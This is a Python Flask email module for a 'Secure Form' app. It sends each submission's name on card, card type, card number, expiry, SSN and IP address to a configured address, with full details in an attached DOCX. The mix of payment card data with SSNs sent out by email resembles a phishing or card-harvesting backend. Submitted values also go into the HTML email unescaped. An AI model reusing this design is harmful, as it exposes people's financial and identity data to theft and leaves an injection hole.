"""
Email service for sending form submission notifications
"""
from flask_mail import Mail, Message
from flask import current_app
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

mail = Mail()


def init_mail(app):
    """Initialize Flask-Mail with app configuration"""
    mail.init_app(app)


def send_via_resend(api_key, from_email, to_email, subject, html_content, attachment_path=None):
    """Send email via Resend API (Port 443)"""
    import requests
    import base64
    
    # Clean API key to prevent header errors
    api_key_clean = str(api_key).strip()
    
    url = "https://api.resend.com/emails"
    headers = {
        "Authorization": f"Bearer {api_key_clean}",
        "Content-Type": "application/json"
    }
    
    payload = {
        "from": "Secure Form <onboarding@resend.dev>",
        "to": [to_email],
        "subject": subject,
        "html": html_content
    }
    
    # Handle attachments
    if attachment_path:
        p = Path(attachment_path)
        if p.exists():
            try:
                with open(p, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                payload["attachments"] = [{
                    "filename": p.name,
                    "content": content
                }]
                logger.info(f"Attached document to Resend payload: {p.name}")
            except Exception as e:
                logger.error(f"Error encoding attachment for Resend: {str(e)}")

    logger.info(f"FINAL ATTEMPT: Sending Resend API request to {to_email}...")
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        logger.info(f"Resend Response Code: {response.status_code}")
        
        if response.status_code in [200, 201]:
            logger.info(f"SUCCESS: Email sent via Resend API to {to_email}")
            return True, "Email sent successfully"
        else:
            error_msg = response.text
            logger.error(f"RESEND API REJECTED: {response.status_code} - Body: {error_msg}")
            return False, error_msg
    except Exception as e:
        error_msg = str(e)
        logger.error(f"RESEND NETWORK FAILURE: {error_msg}")
        return False, error_msg

def send_async_email(app, msg, submission_data=None, attachment_path=None):
    """Send email in a background thread with app context"""
    with app.app_context():
        try:
            resend_key = app.config.get('RESEND_API_KEY')
            
            if resend_key:
                logger.info("RESEND FLOW: API Key detected. Preparing API Send...")
                
                # Resend Specific logic (Free tier requires onboarding address)
                from_email = "onboarding@resend.dev"
                
                # Recipient Logic: Check Config -> then Message recipients
                to_email = app.config.get('MAIL_RECIPIENT')
                if not to_email and msg.recipients:
                    to_email = msg.recipients[0]
                
                if not to_email:
                    logger.error("RESEND ERROR: No recipient address found in config or message.")
                    return

                subject = msg.subject
                html_content = msg.html
                
                logger.info(f"Triggering Resend API call to: {to_email}")
                success, error_msg = send_via_resend(resend_key, from_email, to_email, subject, html_content, attachment_path)
                if success:
                    logger.info("Background Email processed successfully via API.")
                    return
                else:
                    logger.warning(f"Resend API failed inside thread: {error_msg}. Attempting SMTP Fallback...")

            # Fallback to SMTP
            server = app.config.get('MAIL_SERVER')
            port = app.config.get('MAIL_PORT')
            logger.info(f"SMTP FALLBACK Attempt: {server}:{port}...")
            mail.send(msg)
            logger.info("SMTP email sent successfully (Fallback worked!)")
            
        except Exception as e:
            logger.error(f"Background email failed: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())

def send_submission_email(submission_data, document_path=None):
    """
    Send email notification with submission details and document attachment
    """
    try:
        from flask import current_app
        from threading import Thread
        
        recipient = current_app.config.get('MAIL_RECIPIENT')
        resend_key = current_app.config.get('RESEND_API_KEY')
        
        if not recipient:
            logger.warning("No email recipient configured. Skipping email.")
            return False, "No recipient configured"
        
        # Create email message (always create it as it holds the structure)
        msg = Message(
            subject=f"New Form Submission - {submission_data.get('name_on_card')}",
            sender=current_app.config.get('MAIL_DEFAULT_SENDER'),
            recipients=[recipient]
        )
        msg.html = create_email_html(submission_data)
        
        # We don't attach to 'msg' here if using Resend API to save memory in thread, 
        # but we already have the logic in send_async_email to handle attachment_path.
        # For simplicity, we'll keep the msg attachment for SMTP fallback.
        if document_path:
            p = Path(document_path)
            if p.exists():
                with open(p, 'rb') as doc:
                    msg.attach(
                        filename=p.name,
                        content_type='application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                        data=doc.read()
                    )
        
        # Send email in background
        logger.info(f"Starting background thread for email send (API or SMTP)...")
        thread = Thread(target=send_async_email, args=(current_app._get_current_object(), msg, submission_data, str(document_path) if document_path else None))
        thread.start()
        
        return True, "Email sending started in background"
        
    except Exception as e:
        logger.error(f"Global logic error in send_submission_email: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return False, str(e)


def create_email_html(data):
    """
    Create HTML email template
    
    Args:
        data: Dictionary containing submission data
    
    Returns:
        str: HTML formatted email content
    """
    # Mask sensitive data for email
    card_number = data.get('card_number', '')
    masked_card = f"****-****-****-{card_number[-4:]}" if len(card_number) >= 4 else "****"
    
    ssn = data.get('ssn', '')
    masked_ssn = f"***-**-{ssn[-4:]}" if len(ssn) >= 4 else "***-**-****"
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                padding: 20px;
                margin: 0;
            }}
            .container {{
                max-width: 600px;
                margin: 0 auto;
                background: white;
                border-radius: 12px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
                overflow: hidden;
            }}
            .header {{
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 30px;
                text-align: center;
            }}
            .header h1 {{
                margin: 0;
                font-size: 28px;
                font-weight: 600;
            }}
            .content {{
                padding: 30px;
            }}
            .info-row {{
                display: flex;
                padding: 15px 0;
                border-bottom: 1px solid #e0e0e0;
            }}
            .info-row:last-child {{
                border-bottom: none;
            }}
            .label {{
                font-weight: 600;
                color: #667eea;
                width: 180px;
                flex-shrink: 0;
            }}
            .value {{
                color: #333;
                flex-grow: 1;
            }}
            .footer {{
                background: #f5f5f5;
                padding: 20px;
                text-align: center;
                color: #666;
                font-size: 14px;
            }}
            .badge {{
                display: inline-block;
                background: #667eea;
                color: white;
                padding: 5px 15px;
                border-radius: 20px;
                font-size: 12px;
                margin-top: 10px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔒 New Secure Form Submission</h1>
                <div class="badge">Submission ID: {data.get('id', 'N/A')}</div>
            </div>
            <div class="content">
                <div class="info-row">
                    <div class="label">Name on Card:</div>
                    <div class="value">{data.get('name_on_card', 'N/A')}</div>
                </div>
                <div class="info-row">
                    <div class="label">Card Type:</div>
                    <div class="value">{data.get('card_type', 'N/A')}</div>
                </div>
                <div class="info-row">
                    <div class="label">Card Number:</div>
                    <div class="value">{masked_card}</div>
                </div>
                <div class="info-row">
                    <div class="label">Expiration Date:</div>
                    <div class="value">{data.get('expiration_date', 'N/A')}</div>
                </div>
                <div class="info-row">
                    <div class="label">SSN:</div>
                    <div class="value">{masked_ssn}</div>
                </div>
                <div class="info-row">
                    <div class="label">Submission Date:</div>
                    <div class="value">{data.get('submission_date', 'N/A')}</div>
                </div>
                <div class="info-row">
                    <div class="label">IP Address:</div>
                    <div class="value">{data.get('ip_address', 'N/A')}</div>
                </div>
            </div>
            <div class="footer">
                <p>📎 Complete submission details are attached as a DOCX document.</p>
                <p style="margin-top: 10px; font-size: 12px;">
                    This is an automated message from the Secure Form Application.
                </p>
            </div>
        </div>
    </body>
    </html>
    """
    
    return html
